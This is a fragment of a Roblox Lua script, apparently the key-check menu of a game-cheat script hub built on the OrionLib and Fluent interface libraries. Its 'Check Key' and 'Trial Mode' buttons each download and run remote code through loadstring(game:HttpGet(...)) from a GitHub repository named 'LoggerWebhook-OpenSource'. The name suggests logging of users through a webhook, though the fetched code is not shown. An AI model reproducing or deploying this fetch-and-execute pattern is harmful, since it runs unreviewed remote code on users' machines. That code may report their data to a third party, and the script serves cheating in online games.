        OrionLib:Destroy()
  	end    
})

-- Finishing

OrionLib:Init()

end
end

local Checkkey = Tabs.KeySys:AddButton({
    Title = "Check Key",
    Description = "Enter Key before pressing this button",
    Callback = function()
        local response = KeyGuardLibrary.validatePremiumKey(key)
        if response == trueData then
			loadstring(game:HttpGet("https://raw.githubusercontent.com/dizzyhvh/LoggerWebhook-OpenSource/refs/heads/main/premium%20succes"))()
			Fluent:Destroy()
			MakeScriptHub()
		else
			task.wait(1)
			loadstring(game:HttpGet("https://raw.githubusercontent.com/dizzyhvh/LoggerWebhook-OpenSource/refs/heads/main/premium%20failed"))()
			game:GetService("Players").LocalPlayer:Kick("Wrong Key")
		end
	end
})

function trial()
	Fluent:Destroy()
	MakeScriptHub()
end

local trial = Tabs.KeySys:AddButton({
    Title = "Trial Mode (tester vs bypasses)",
    Callback = function()
		loadstring(game:HttpGet("https://raw.githubusercontent.com/dizzyhvh/LoggerWebhook-OpenSource/refs/heads/main/premium%20trial"))()
		trial()
	end
})